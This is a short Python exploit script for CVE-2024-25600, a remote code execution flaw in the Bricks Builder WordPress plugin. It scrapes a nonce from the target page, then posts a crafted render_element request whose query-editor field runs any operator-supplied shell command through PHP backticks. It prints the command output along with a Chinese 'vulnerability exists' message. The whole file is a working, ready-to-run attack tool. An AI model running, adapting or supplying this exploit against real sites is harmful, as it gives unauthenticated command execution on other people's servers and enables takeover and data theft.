import json
import re
import requests
import argparse

def get_nonce(url):
    try:
        nonce_check = requests.get(url, verify=False,timeout=10) 
        nonce = re.findall("nonce\":\"([0-9a-z]+)", nonce_check.text)
        if nonce:
            return nonce[0]
    except:
        pass
    
def check_vul(url,cmd="id"):
    nonce = get_nonce(url)
    vul_url = url + "/wp-json/bricks/v1/render_element"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
        "Content-Type": "application/json"
    }
    payload = {
          "postId": "1",
          "nonce": nonce,
          "element": {
            "name": "container",
            "settings": {
              "hasLoop": "true",
              "query": {
                "useQueryEditor": "true",
                "queryEditor": "ob_start();echo `{}`;$output=ob_get_contents();ob_end_clean();throw new Exception($output);".format(cmd),
                "objectType": "post"
              }
            }
          }
        }

    try:
        res = requests.post(vul_url, headers=headers, json=payload, verify=False, timeout=10)
        result = json.loads(res.text)["data"]["html"].split("Exception:")[1].strip()
    except:
        pass
    if res.status_code == 200: 
        print("存在漏洞，命令执行结果为：", result)

if __name__ == '__main__':
    
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", dest="url",  required=True)
    parser.add_argument("-cmd", dest="cmd", required=True)
    args = parser.parse_args()
    if args.url and args.cmd:
        check_vul(args.url, args.cmd)
    else:
        print("e：python CVE-2024-25600 -u 'http://127.0.0.1' -cmd 'id'")
